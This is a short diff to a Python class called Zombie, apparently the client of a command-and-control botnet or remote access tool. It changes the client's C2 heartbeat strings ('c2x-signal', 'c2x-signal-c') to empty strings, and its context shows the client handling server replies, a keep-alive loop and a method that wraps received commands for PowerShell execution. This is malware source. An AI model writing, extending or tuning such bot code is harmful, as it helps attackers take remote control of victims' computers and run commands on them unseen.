@@ -103,7 +103,7 @@ class Zombie:
             self.close_client_socket()
             exit()
 
-        elif reply_msg == 'c2x-signal':
+        elif reply_msg == '':
             pass
 
         elif reply_msg.startswith('cid='):
@@ -140,7 +140,7 @@ class Zombie:
                 break
             sleep(5)
             if self.got_hello:
-                self.msg_manager(msg='c2x-signal-c')
+                self.msg_manager(msg='')
 
     def powershellize_command(self, command):
         powershell_command = 'powershell "{}"'.format(command)
